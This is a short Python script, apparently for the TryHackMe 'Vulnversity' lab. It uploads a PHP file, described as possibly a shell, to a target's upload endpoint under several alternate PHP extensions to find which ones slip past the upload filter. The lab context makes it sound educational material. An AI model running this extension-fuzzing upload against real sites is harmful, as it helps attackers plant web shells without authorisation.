#!/usr/bin/env python

#Origin: John Hammon Tryhackme - Vulnversity walkthrough from Youtube
#Some modifications made by me to get better understanding about the proces
#Thanks John for the education!
#To be used in Vulnversity task 4


import requests
import os
import argparse

# Create the CLI arguments parser
parser = argparse.ArgumentParser()
parser.add_argument('--url', type=str, required=True, help="Targets full URL")  # Parse the target URL argument
parser.add_argument('--php', type=str, required=True, help="The PHP file you try to upload. For ex. a shell") #Specify the file to be used
args = parser.parse_args()


url = f"{args.url}:3333/internal/index.php"

original_filename = args.php

#TODO: This could be changed to read extensions from a file and become the third CLI argument
extensions = [".php", ".php3", ".php4", ".php5",".phtml"]

#main loop to go through the extensions
for e in extensions:
    file_iteration_to_upload = args.php[:-4] + e
    os.rename(original_filename, file_iteration_to_upload)
    #make the dictionary for requests to use
    upload_files_d = {"file": open(file_iteration_to_upload, "rb")} 
    #get the response from the request
    response = requests.post(url, files=upload_files_d)

    if "Extension not allowed" in response.text:
        print(f"{e} not allowed")
    else:
        print(f"{e} seems to be allowed!")
    
    original_filename = file_iteration_to_upload

#Cleanup afterwards
os.rename(file_iteration_to_upload, args.php)
